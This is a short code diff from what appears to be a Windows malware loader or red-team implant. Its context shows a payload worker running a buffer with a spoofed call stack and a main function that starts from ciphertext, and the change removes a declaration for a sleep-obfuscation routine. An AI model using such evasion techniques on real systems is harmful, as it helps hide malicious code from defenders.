@@ -66,8 +66,6 @@ VOID NTAPI PayloadWorker(PVOID Context) {
     StackSpoof::ExecuteWithSpoofedStack(pArgs->pBuffer, pArgs->dwSize);
 }
 
-VOID ZileanSleep(DWORD dwTimeout);
-
 int main() {
 
     PBYTE                                      Data                 = (PBYTE)CipherText;
